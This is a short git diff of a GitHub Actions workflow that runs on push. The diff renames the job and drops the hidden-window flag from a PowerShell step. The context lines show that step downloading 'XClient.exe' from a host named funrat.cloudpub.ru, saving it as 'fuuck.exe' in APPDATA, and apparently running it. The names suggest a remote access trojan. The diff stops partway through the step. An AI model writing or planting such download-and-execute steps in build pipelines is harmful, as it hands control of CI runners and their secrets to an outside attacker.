@@ -1,4 +1,4 @@
-name: Download and Run .exe file silently
+name: Download and Run .exe file with visible console
 
 on:
   push:
@@ -13,9 +13,9 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v2
 
-      - name: Download and run .exe file without console
+      - name: Download and run .exe file with visible console
         run: |
-          powershell -WindowStyle Hidden -Command "
+          powershell -Command "
             $exePath = Join-Path $env:APPDATA 'fuuck.exe'
             Invoke-WebRequest -Uri 'https://funrat.cloudpub.ru/XClient.exe' -Method GET -OutFile $exePath
             Start-Sleep -Seconds 5
